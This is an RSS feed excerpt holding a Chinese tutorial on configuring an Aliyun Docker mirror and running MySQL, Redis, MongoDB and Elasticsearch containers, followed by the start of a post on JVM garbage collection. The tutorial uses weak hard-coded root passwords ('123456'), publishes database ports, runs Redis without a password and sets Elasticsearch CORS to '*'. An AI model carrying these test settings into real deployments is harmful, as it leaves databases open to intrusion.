&lt;p&gt;本文主要说说如何配置阿里云的镜像加速器。&lt;/p&gt;
&lt;h3 id=&quot;登录阿里云获取加速信息&quot;&gt;2.1 登录阿里云获取加速信息&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;首先你需要注册一个阿里云账号，没有的话，通过下面的连接跳转注册：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;a href=&quot;https://dev.aliyun.com/&quot; class=&quot;uri&quot;&gt;https://dev.aliyun.com/&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;跳转镜像加速页 &lt;a href=&quot;https://cr.console.aliyun.com/&quot; class=&quot;uri&quot;&gt;https://cr.console.aliyun.com/&lt;/a&gt;，获取加速配置信息：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155576486632086&quot; title=&quot;阿里云Docker镜像加速页&quot; alt=&quot;阿里云Docker镜像加速页&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;配置-docker&quot;&gt;2.2 配置 Docker&lt;/h3&gt;
&lt;h4 id=&quot;确定-docker-client-版本&quot;&gt;2.2.1 确定 Docker Client 版本&lt;/h4&gt;
&lt;p&gt;在配置之前，首先需要&lt;strong&gt;确定 Docker Client 的版本，推荐是 1.10.0+&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155576450710694&quot; title=&quot;确定docker client版本&quot; alt=&quot;确定docker client版本&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;配置镜像加速器&quot;&gt;2.2.2 配置镜像加速器&lt;/h4&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;PS: 这里以 CentOS 系统为例，如果你是别的系统，可以参考阿里云配置加速器官方文档。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;通过修改 daemon 配置文件 &lt;code&gt;/etc/docker/daemon.json&lt;/code&gt; 来使用加速器：&lt;/p&gt;
&lt;p&gt;执行下面命令：&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json &amp;lt;&amp;lt;-'EOF'
{
  &quot;registry-mirrors&quot;: [&quot;https://bjtzu1jb.mirror.aliyuncs.com&quot;]
}
EOF
sudo systemctl daemon-reload
sudo systemctl restart docker&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;验证一下速度&quot;&gt;2.3 验证一下速度&lt;/h3&gt;
&lt;p&gt;以下载 mongodb 为例，看下速度：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155576521351958&quot; title=&quot;docker下载MongoDB&quot; alt=&quot;docker下载MongoDB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;配置了加速器过后，速度终于飚起来了。&lt;/p&gt;
&lt;h2 id=&quot;二快速安装搭建-mysql-环境&quot;&gt;二、快速安装&amp;amp;搭建 Mysql 环境&lt;/h2&gt;
&lt;p&gt;本节中，我们将学习如何通过 Docker 快速安装与搭建 Mysql 环境。&lt;/p&gt;
&lt;h3 id=&quot;下载-mysql-镜像&quot;&gt;2.1 下载 Mysql 镜像&lt;/h3&gt;
&lt;p&gt;这里以 Mysql 5.7 为例：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;docker pull mysql:5.7&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下载完成后，通过 &lt;code&gt;docker images&lt;/code&gt; 检查一下镜像是否下载成功:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155835327389655&quot; title=&quot;验证本地是否下载好Mysql 5.7镜像&quot; alt=&quot;验证本地是否下载好Mysql 5.7镜像&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;先以最简单方式启动&quot;&gt;2.2 先以最简单方式启动&lt;/h3&gt;
&lt;p&gt;先以简单的方式启动：&lt;/p&gt;
&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;docker run -d \
--name mysql \
-p 3306:3306 \
-e MYSQL_ROOT_PASSWORD=123456 \
mysql:5.7&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;-d&lt;/code&gt;：以后台的方式运行；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--name mysql&lt;/code&gt;：指定容器的名称为 mysql;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p 3306:3306&lt;/code&gt; 将容器的 3306 端口挂载到宿主机的 3306 端口上；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-e MYSQL_ROOT_PASSWORD=123456&lt;/code&gt;：指定 root 的密码为 123456&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;命令执行完成后，你也可以通过 &lt;code&gt;docker ps&lt;/code&gt;命令来确认下容器是否启动成功。若成功，我们需要将容器中的目录文件复制到宿主机中，分别包括：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;mysql 配置文件；&lt;/li&gt;
&lt;li&gt;数据存储目录，以便挂载(PS: 若不挂载到宿主机，每次启动容器数据都会丢失)&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;# 将容器中的 mysql 配置文件复制到宿主机中指定路径下，路径你可以根据需要，自行修改
docker cp mysql:/etc/mysql/mysql.conf.d/mysqld.cnf /usr/local/docker/mysql/config
# 将容器中的 mysql 存储目录复制到宿主机中
docker cp mysql:/var/lib/mysql/ /usr/local/docker/mysql/data&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;完成这一切后，让我们将刚刚运行的容器删除掉。&lt;/p&gt;
&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;docker rm -f mysql&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;PS: mysql 是我们运行容器时，指定的名称，当然，你也可以先执行 &lt;code&gt;docker ps&lt;/code&gt;, 通过容器 ID 来删除。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;正式运行-mysql-容器&quot;&gt;2.3 正式运行 Mysql 容器&lt;/h3&gt;
&lt;p&gt;接下来，正式运行 Mysql 容器：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;docker run -d \
--name mysql \
-p 3306:3306 \
-v /usr/local/docker/mysql/config/mysqld.cnf:/etc/mysql/mysql.conf.d/mysqld.cnf \
-v /usr/local/docker/mysql/data/mysql:/var/lib/mysql \
-e MYSQL_ROOT_PASSWORD=123456 \
mysql:5.7&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其他不变，额外添加了两个挂载子命令：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;-v /usr/local/docker/mysql/config/mysqld.cnf:/etc/mysql/mysql.conf.d/mysqld.cnf&lt;/code&gt;: 将容器中 /etc/mysql/mysql.conf.d/mysqld.cnf 配置文件挂载到宿主机的 /usr/local/docker/mysql/config/mysqld.cnf 文件上；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v /usr/local/docker/mysql/data:/var/lib/mysql&lt;/code&gt;: 将容器中 /var/lib/mysql 数据目录挂载到宿主机的 /usr/local/docker/mysql/data 目录下；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;执行命令完成后，查看下容器是否启动：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155835707306487&quot; title=&quot;查看mysql容器是否启动成功&quot; alt=&quot;查看mysql容器是否启动成功&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，容器运行成功&lt;/p&gt;
&lt;h3 id=&quot;通过-mysql-客户端连接一下试试&quot;&gt;2.4 通过 Mysql 客户端连接一下试试&lt;/h3&gt;
&lt;p&gt;通过 MySQL 客户端连接刚刚创建的 mysql, 看看能否连接成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155835827223551&quot; title=&quot;通过mysql客户端连接试试看&quot; alt=&quot;通过mysql客户端连接试试看&quot;/&gt;&lt;/p&gt;
&lt;p&gt;连接成功了！&lt;/p&gt;
&lt;h2 id=&quot;三快速安装搭建-redis-环境&quot;&gt;三、快速安装&amp;amp;搭建 Redis 环境&lt;/h2&gt;
&lt;p&gt;本节中，我们将学习如何利用 Docker 安装&amp;amp;搭建 Redis 环境。&lt;/p&gt;
&lt;h3 id=&quot;下载-redis-镜像&quot;&gt;3.1 下载 Redis 镜像&lt;/h3&gt;
&lt;p&gt;首先拉取 Redis 镜像, 这里我选择的是 &lt;code&gt;redis:alpine&lt;/code&gt; 轻量级镜像版本：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;docker pull redis:alpine&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下载完成后，通过 &lt;code&gt;docker images&lt;/code&gt; 确认镜像是否已经下载到本地：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155704602465289&quot; title=&quot;查看redis镜像是否下载成功&quot; alt=&quot;查看redis镜像是否下载成功&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;运行-redis-容器&quot;&gt;3.2 运行 Redis 容器&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;docker run -p 6379:6379 --name redis -v /usr/local/docker/redis/redis.conf:/etc/redis/redis.conf -v /usr/local/docker/redis/data:/data -d redis:alpine redis-server /etc/redis/redis.conf --appendonly yes&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;命令说明：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;-p 6379:6379&lt;/code&gt;: 将容器的 6379 端口映射到宿主机的 6379 端口；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v /usr/local/docker/redis/data:/data&lt;/code&gt; : 将容器中的 /data 数据存储目录, 挂载到宿主机中 /usr/local/docker/redis/data 目录下；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v /usr/local/docker/redis/redis.conf:/etc/redis/redis.conf&lt;/code&gt; ： 将容器中 /etc/redis/redis.conf 配置文件，挂载到宿主机的 /usr/local/docker/redis/redis.conf 文件上；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;redis-server --appendonly yes&lt;/code&gt;: 在容器执行 redis-server 启动命令，并打开 redis 持久化配置;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;命令运行完成后，查看容器是否启动成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155704546602185&quot; title=&quot;查看docker redis是否启动成功&quot; alt=&quot;查看docker redis是否启动成功&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到 redis 容器已经启动成功了！&lt;/p&gt;
&lt;h3 id=&quot;连接刚刚创建好的容器&quot;&gt;3.3 连接刚刚创建好的容器&lt;/h3&gt;
&lt;p&gt;执行如下命令，连接 redis：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;docker run -it redis:alpine redis-cli -h 172.17.0.1&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/152465883632761&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;四快速安装搭建-mongdb-环境&quot;&gt;四、快速安装&amp;amp;搭建 MongDB 环境&lt;/h2&gt;
&lt;p&gt;本节中，我们将学习如何通过 Docker 快速安装与搭建 MongoDB 环境。&lt;/p&gt;
&lt;h3 id=&quot;下载-mongodb-镜像&quot;&gt;4.1 下载 MongoDB 镜像&lt;/h3&gt;
&lt;p&gt;这里以 mongo 4 版本为例，下载镜像：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;docker pull mongo:4&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下载完成后，确认一下镜像是否下载成功:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155807676764627&quot; title=&quot;验证mongodb镜像是否下载成功&quot; alt=&quot;验证mongodb镜像是否下载成功&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;运行-mongodb-镜像&quot;&gt;4.2 运行 MongoDB 镜像&lt;/h3&gt;
&lt;p&gt;下载成功后，运行 mongoDB 镜像：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;docker run -d \
--name mongo \
-v /usr/local/docker/mongo/configdb:/data/configdb \
-v /usr/local/docker/mongo/data:/data/db \
-p 27017:27017 \
mongo:4 \
--auth&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;-d&lt;/code&gt;: 以后台的方式运行；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--name mongo&lt;/code&gt;: 指定容器名称为 mongo;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v /usr/local/docker/mongo/configdb:/data/configdb&lt;/code&gt;: 将容器中 /data/configdb 目录挂载到宿主机的 /usr/local/docker/mongo/configdb 目录下；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v /usr/local/docker/mongo/data:/data/db&lt;/code&gt;: 将容器中 /data/db 数据目录挂载到宿主机的 /usr/local/docker/mongo/data 目录下；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p 27017:27017&lt;/code&gt;: 将容器的 27017 端口映射到宿主机的 27017 端口；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;执行命令完成后，查看下容器是否启动：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155808382373145&quot; title=&quot;检查mongoDB容器是否启动成功&quot; alt=&quot;检查mongoDB容器是否启动成功&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;添加管理员账号&quot;&gt;4.3 添加管理员账号&lt;/h3&gt;
&lt;p&gt;执行命令：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;docker exec -it mongo mongo admin&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后，创建一个拥有最高权限 root 账号:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;db.createUser({ user: 'admin', pwd: '123456', roles: [ { role: &quot;root&quot;, db: &quot;admin&quot; } ] });&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;创建成功后，你会看到 &lt;code&gt;Successfully added user&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155808432288674&quot; title=&quot;创建root账号成功&quot; alt=&quot;创建root账号成功&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;用新创建的-root-账户连接测试一下&quot;&gt;4.4 用新创建的 root 账户连接，测试一下&lt;/h3&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;docker run -it --rm --link mongo:mongo mongo mongo -u admin -p 123456 --authenticationDatabase admin mongo/admin&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;连接成功后，我们可以执行相关 sql：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;显示所有的数据库：&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;show dbs&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;使用某个数据库：&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;use admin&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155808476436816&quot; title=&quot;mongDB显示所有的库&quot; alt=&quot;mongDB显示所有的库&quot;/&gt;&lt;/p&gt;
&lt;p&gt;输入命令 &lt;code&gt;exit&lt;/code&gt;，退出连接！&lt;/p&gt;
&lt;h2 id=&quot;五快速安装搭建-elasticsearch-环境&quot;&gt;五、快速安装&amp;amp;搭建 Elasticsearch 环境&lt;/h2&gt;
&lt;p&gt;本节中，我们将学习如何通过 Docker 快速安装与搭建 Elasticsearch 环境。&lt;/p&gt;
&lt;h3 id=&quot;下载-elasticsearch-镜像&quot;&gt;5.1 下载 Elasticsearch 镜像&lt;/h3&gt;
&lt;p&gt;这里以 Elasticsearch 6.5.0 为快速安装&amp;amp;搭建 Elasticsearch 环境例：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;docker pull elasticsearch:6.5.0&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下载完成后，通过 &lt;code&gt;docker images&lt;/code&gt; 检查一下镜像是否下载成功:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155842816493497&quot; title=&quot;查看es镜像是否下载成功&quot; alt=&quot;查看es镜像是否下载成功&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;先简单运行-elasticsearch-镜像&quot;&gt;5.2 先简单运行 Elasticsearch 镜像&lt;/h3&gt;
&lt;p&gt;下载成功后，简单运行 Elasticsearch 镜像：&lt;/p&gt;
&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;docker run -d \
--name es \
-p 9200:9200 -p 9300:9300 \
-e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms200m -Xmx200m&quot; \
elasticsearch:6.5.0&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;-d&lt;/code&gt;：以后台的方式运行；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--name es&lt;/code&gt;：指定容器的名称为 es;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p 9200:9200 -p 9300:9300&lt;/code&gt; 将容器的 9200、9300 端口挂载到宿主机的 9200、9300 端口上；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms200m -Xmx200m&quot;&lt;/code&gt;：指定为单节点模式，JVM 内存占用 200m&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;命令执行完成后，你也可以通过 &lt;code&gt;docker ps&lt;/code&gt;命令来确认下容器是否启动成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155842849622361&quot; title=&quot;查看es容器是否运行成功&quot; alt=&quot;查看es容器是否运行成功&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到 es 容器运行成功了，接下来，进入容器中：&lt;/p&gt;
&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;docker exec -it es /bin/bash&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;安装 &lt;strong&gt;&lt;a href=&quot;https://github.com/medcl/elasticsearch-analysis-ik&quot;&gt;analysis-ik&lt;/a&gt;&lt;/strong&gt; 中文分词插件：&lt;/p&gt;
&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;./bin/elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.5.0/elasticsearch-analysis-ik-6.5.0.zip&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5.4090909090909&quot;&gt;
&lt;p&gt;PS: es 从 v5.5.1 版本开始支持自带的 es 插件命令来安装，如果你安装的版本不是 6.5.0，需要将命令中的版本号修改一下，具体参考 &lt;a href=&quot;https://github.com/medcl/elasticsearch-analysis-ik&quot; class=&quot;uri&quot;&gt;https://github.com/medcl/elasticsearch-analysis-ik&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155842888046499&quot; title=&quot;analysis-ik安装成功&quot; alt=&quot;analysis-ik安装成功&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装成功后，退出容器：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;exit&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;删除刚刚运行的容器：&lt;/p&gt;
&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;docker rm -f es&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;PS: 当然了，你也可以通过容器的 ID 来删除。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;复制相关文件&quot;&gt;5.3 复制相关文件&lt;/h3&gt;
&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;# 复制 es 配置文件目录到宿主机指定目录，目标目录你可以根据需要，自行修改
docker cp es:/usr/share/elasticsearch/config /usr/local/docker/es
# 复制 es 持久化数据目录到宿主机指定目录
docker cp es:/usr/share/elasticsearch/data /usr/local/docker/es
# 复制 es 插件目录到宿主机指定目录
docker cp es:/usr/share/elasticsearch/plugins /usr/local/docker/es&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;修改-es-相关配置&quot;&gt;5.4 修改 es 相关配置&lt;/h3&gt;
&lt;p&gt;进入我们刚刚指定的 config 配置目录，修改 &lt;code&gt;jvm.options&lt;/code&gt; 文件：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;-Xms300m
-Xmx300m&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;PS: 因为小哈测试服务器就 2G 内存，这里我改成了 JVM 内存占用 300m, 如果你的内存够用，可不用改。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;修改 &lt;code&gt;elasticsearch.yml&lt;/code&gt;文件, 添加如下配置：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;node.name: master
http.cors.enabled: true
http.cors.allow-origin: &quot;*&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;解释一下添加的配置，设置节点为 master 节点，并允许跨域访问，以便后面使用 head 插件图形化界面访问。&lt;/p&gt;
&lt;h3 id=&quot;运行-elasticsearch-容器&quot;&gt;5.5 运行 Elasticsearch 容器&lt;/h3&gt;
&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;docker run -d \
--name es \
-p 9200:9200 -p 9300:9300 \
-v /usr/local/docker/es/config:/usr/share/elasticsearch/config \
-v /usr/local/docker/es/data:/usr/share/elasticsearch/data \
-v /usr/local/docker/es/plugins:/usr/share/elasticsearch/plugins \
elasticsearch:6.5.0 &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这次，我们额外添加了相关挂载命令：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;-v /usr/local/docker/es/config:/usr/share/elasticsearch/config&lt;/code&gt;: 将容器中的 /usr/share/elasticsearch/config 配置目录挂载到宿主机的 /usr/local/docker/es/config 目录下；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v /usr/local/docker/es/data:/usr/share/elasticsearch/data&lt;/code&gt;： 将容器中的 /usr/share/elasticsearch/data 数据目录挂载到宿主机的 /usr/local/docker/es/data 目录下；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v /usr/local/docker/es/plugins:/usr/share/elasticsearch/plugins&lt;/code&gt;：将容器中的 /usr/share/elasticsearch/plugins 插件目录挂载到宿主机的 /usr/local/docker/es/plugins 目录下；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;测试一下瞅瞅-es-是否能够正常访问&quot;&gt;5.6 测试一下，瞅瞅 es 是否能够正常访问&lt;/h3&gt;
&lt;p&gt;测试一下，看 es 是否启动成功：&lt;/p&gt;
&lt;pre class=&quot;cmd&quot;&gt;
&lt;code&gt;curl http://localhost:9200&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155842998660442&quot; title=&quot;查看es是否能够正常访问&quot; alt=&quot;查看es是否能够正常访问&quot;/&gt;&lt;/p&gt;
&lt;p&gt;OK, 到此 es 的单节点环境就搭建好了！&lt;/p&gt;
&lt;h2 id=&quot;六总结&quot;&gt;六、总结&lt;/h2&gt;
&lt;p&gt;好了，到这里，小哈就已经把常用的测试环境搭建介绍完毕了。如果你还有啥疑问，不妨后台私信我！哈哈，祝您看完本文有所收获！&lt;/p&gt;
&lt;h2 id=&quot;免费分享-面试学习福利资源&quot;&gt;免费分享 | 面试&amp;amp;学习福利资源&lt;/h2&gt;
&lt;p&gt;最近在网上发现一个不错的 PDF 资源《Java 核心知识&amp;amp;面试.pdf》分享给大家，不光是面试，学习，你都值得拥有！！！&lt;/p&gt;
&lt;p&gt;获取方式: 关注公众号: &lt;strong&gt;小哈学Java&lt;/strong&gt;, 后台回复&lt;strong&gt;资源&lt;/strong&gt;，既可&lt;strong&gt;免费无套路获取资源链接&lt;/strong&gt;，下面是目录以及部分截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651432676587&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651441280253&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651443805696&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651470347464&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651449186666&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155651451040055&quot; title=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot; alt=&quot;关注微信公众号【小哈学Java】,回复【资源】，即可免费无套路领取资源链接哦&quot;/&gt;&lt;/p&gt;
&lt;p&gt;重要的事情说两遍，关注公众号: &lt;strong&gt;小哈学Java&lt;/strong&gt;, 后台回复&lt;strong&gt;资源&lt;/strong&gt;，既可&lt;strong&gt;免费无套路获取资源链接&lt;/strong&gt; ！！！&lt;/p&gt;
</description>
<pubDate>Wed, 22 May 2019 11:25:00 +0000</pubDate>
<dc:creator>犬小哈</dc:creator>
<og:description>欢迎关注个人微信公众号: 小哈学Java , 文末 分享阿里 P8 高级架构师吐血总结的 《Java 核心知识整理&amp;面试.pdf》资源链接 ！！ 个人网站: 'https://www.exceptio</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/quanxiaoha/p/10908003.html</dc:identifier>
</item>
<item>
<title>JVM垃圾回收算法 - 方块人</title>
<link>http://www.cnblogs.com/Cubemen/p/10905130.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Cubemen/p/10905130.html</guid>
<description>&lt;p&gt;　　程序计数器，虚拟机栈，本地方法3个区域随线程而生，随线程而灭，栈中的栈帧随着方法的进入和退出有条不紊地执行着出栈和入栈操作，每一个栈帧中分配多少内存，基本上是在类结构确定下来就已知。因此这几个区域的内存分配和回收都具备确定性。在这几个区域就不需要考虑太多回收问题。垃圾收集器主要关注于Java堆和方法区。&lt;/p&gt;

&lt;p&gt;　　首先说为什么要判断是否存活，当垃圾收集器在对堆进行回收前，第一就是要确定对象哪些是还在被引用的或者后面还需要被引用的，即存活，哪些是已经“死去”（即不可能再被任何途径使用）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;1、引用计数算法&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　在对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就加1，引用失效时就减1.任何时刻计数器为0的对象就是不可能再被使用的。这个方法效率挺高，大部分情况下也是很不错的算法。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;但是在JVM中会很难解决对象之间相互循环引用的问题&lt;/strong&gt;，就如果两个对象之间相互调用，这时候就会发生类似死锁的情况，即这个地方相互调用会使得引用计数法始终认为有对象在引用当前对象，就一直计数值大于或等于1，也就无法通知GC收集器回收它们。但是实际的情况是这两个对象后面已经不再调用，所以这个方法虽然简单高效，但不是我们的首选。&lt;strong&gt;虚拟机也不是通过这个算法来判断对象是否存活的&lt;/strong&gt;。&lt;/p&gt;
